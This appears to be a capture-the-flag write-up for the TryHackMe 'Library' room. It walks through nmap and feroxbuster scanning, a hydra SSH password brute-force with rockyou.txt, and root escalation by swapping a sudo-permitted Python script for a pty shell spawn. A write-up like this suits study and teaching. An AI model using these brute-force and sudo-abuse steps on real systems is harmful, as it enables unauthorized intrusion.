# Library

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information
```
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: boot2root machine for FIT and bsides guatemala CTF
```
Room link: [https://tryhackme.com/r/room/bsidesgtlibrary](https://tryhackme.com/r/room/bsidesgtlibrary)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
└─$ nmap -v -sV -sC 10.10.181.145
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 11:37 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Initiating Ping Scan at 11:37
Scanning 10.10.181.145 [2 ports]
Completed Ping Scan at 11:37, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:37
Completed Parallel DNS resolution of 1 host. at 11:37, 0.00s elapsed
Initiating Connect Scan at 11:37
Scanning 10.10.181.145 [1000 ports]
Discovered open port 80/tcp on 10.10.181.145
Discovered open port 22/tcp on 10.10.181.145
Completed Connect Scan at 11:37, 0.63s elapsed (1000 total ports)
Initiating Service scan at 11:37
Scanning 2 services on 10.10.181.145
Completed Service scan at 11:37, 6.23s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.181.145.
Initiating NSE at 11:37
Completed NSE at 11:37, 1.38s elapsed
Initiating NSE at 11:37
Completed NSE at 11:37, 0.17s elapsed
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Nmap scan report for 10.10.181.145
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds
```
We have two services running:
- OpenSSH 7.2p2 on port 22
- Apache httpd 2.4.18 on port 80

### Manually browse to the web site

Manually browsing to port 80 shows a blog named `boot2root machine for FIT and bsides Guatemala`.  
There is one blog post called `This is the title of a blog post` made by the user `meliodas`.  
There is also the option to post comments and 3 comments have already been made by:
- root
- www-data
- Anonymous

### Check for files/directories with feroxbuster

Next, we check for files/directories on the web service with `feroxbuster`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
└─$ feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -C 404 -x html,php,txt -u http://10.10.181.145
                                                                                                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.181.145
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c http://10.10.181.145/images => http://10.10.181.145/images/
200      GET       93l      648w     5439c http://10.10.181.145/index.html
200      GET      357l      657w     5908c http://10.10.181.145/master.css
200      GET       14l       70w     5073c http://10.10.181.145/images/sidebar_section_background.png
200      GET       14l       70w     5048c http://10.10.181.145/images/sidebar_background.png
200      GET       15l       73w     5153c http://10.10.181.145/images/intro_background.png
200      GET       51l      287w    21692c http://10.10.181.145/logo.png
200      GET       93l      648w     5439c http://10.10.181.145/
200      GET       14l       70w     5007c http://10.10.181.145/images/nav_background.png
200      GET        2l        4w       33c http://10.10.181.145/robots.txt
[####################] - 5m    350636/350636  0s      found:10      errors:0      
[####################] - 5m    350600/350600  1201/s  http://10.10.181.145/ 
[####################] - 0s    350600/350600  3102655/s http://10.10.181.145/images/ => Directory listing   
```

The most interesting we found was a robots.txt file that we should look into
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
└─$ curl http://10.10.181.145/robots.txt             
User-agent: rockyou 
Disallow: /   
```
This hints to brute-forcing passwords...

### Bruteforce meliodas SSH password

Let's try to find `meliodas` SSH password with `hydra`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
└─$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.181.145 ssh                
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-18 12:11:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.181.145:22/
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344234 to do in 1440:12h, 15 active
[22][ssh] host: 10.10.181.145   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-18 12:13:29
```
And the password is `iloveyou1`.

### Login with SSH

Now we can login as `meliodas` with SSH
```bash          
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
└─$ ssh meliodas@10.10.181.145    
The authenticity of host '10.10.181.145 (10.10.181.145)' can't be established.
ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.181.145' (ED25519) to the list of known hosts.
meliodas@10.10.181.145's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ 
```

### Get the user flag

Next, we can search for the user flag
```bash
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ cat user.txt 
6<REDACTED>c
```

### Enumeration

We start enumerating for ways to escalate our privileges.  
The previous found `bak.py` might be interesting
```bash
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```
And we should also check `sudo -l` because of the file `.sudo_as_admin_successful`
```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

### Privilege escalation

We can't edit the `bak.py` file but we can create a new file
```bash
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? yes
meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/bash")' > bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# 
```
Excellent, we are root.

### Get the root flag

Finally, we locate and cat the root flag
```bash
root@ubuntu:/root# ls -la
total 28
drwx------  3 root root 4096 Aug 24  2019 .
drwxr-xr-x 22 root root 4096 Aug 24  2019 ..
-rw-------  1 root root   43 Aug 24  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Aug 23  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 23  2019 root.txt
root@ubuntu:/root# cat root.txt 
e<REDACTED>7
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [feroxbuster - Github](https://github.com/epi052/feroxbuster)
- [feroxbuster - Kali Tools](https://www.kali.org/tools/feroxbuster/)
- [Hydra - Kali Tools](https://www.kali.org/tools/hydra/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [THC-Hydra - Github](https://github.com/vanhauser-thc/thc-hydra)
